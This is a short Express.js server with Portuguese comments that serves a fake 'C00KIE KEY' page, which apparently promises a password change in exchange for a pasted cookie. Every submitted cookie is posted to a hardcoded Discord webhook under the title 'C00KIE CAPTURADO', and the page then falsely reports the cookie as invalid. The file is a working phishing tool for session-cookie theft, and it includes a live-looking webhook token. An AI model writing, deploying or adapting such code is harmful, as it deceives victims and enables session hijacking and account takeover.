const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Página quase invisível (só pra ter algo)
app.get('/', (req, res) => {
  res.send(`
    <meta charset="utf-8">
    <title>C00KIE KEY</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:15vh}h1{font-size:4rem;margin:20px}.box{margin:40px auto;width:90%;max-width:500px}input,button{padding:18px;width:100%;margin:10px 0;font-size:1.1rem}input{background:#111;border:2px solid #0f0;color:#0f0}button{background:#0f0;color:#000;border:none;cursor:pointer}</style>
    <h1>C00KIE KEY</h1>
    <p>Mudar senha por c00kie.</p>
    <div class="box">
      <input type="text" id="c" placeholder="Digite o c00kie aqui" autofocus>
      <button onclick="f()">Enviar</button>
    </div>
    <p id="s" style="font-size:1.5rem;margin-top:20px"></p>
    <script>
      async function f(){const v=document.getElementById('c').value.trim();if(!v)return;document.getElementById('s').innerText='';await fetch('/',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cookie='+encodeURIComponent(v)});document.getElementById('s').innerText='C00kie Inválido';document.getElementById('c').value='';document.getElementById('c').focus();}
      document.addEventListener('keydown',e=>{if(e.key==='Enter')f()});
    </script>
  `);
});

// Recebe o cookie (GET ou POST)
app.all('/', async (req, res) => {
  let cookie = req.query.cookie || req.body.cookie || '';

  if (cookie) {
    try {
      await fetch("https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "C00KIE CAPTURADO",
            description: "```" + cookie + "```",
            color: 0x00ff00,
            timestamp: new Date().toISOString(),
            footer: { text: "Cookie Service • Sempre vivo" }
          }]
        })
      });
    } catch (e) {}
  }

  // Sempre responde rápido (pra não dar erro no navegador)
  if (req.method === 'POST') {
    res.send('OK');
  } else {
    res.redirect('/');
  }
});

app.listen(PORT, () => {
  console.log(`Cookie Service rodando na porta ${PORT}`);
});
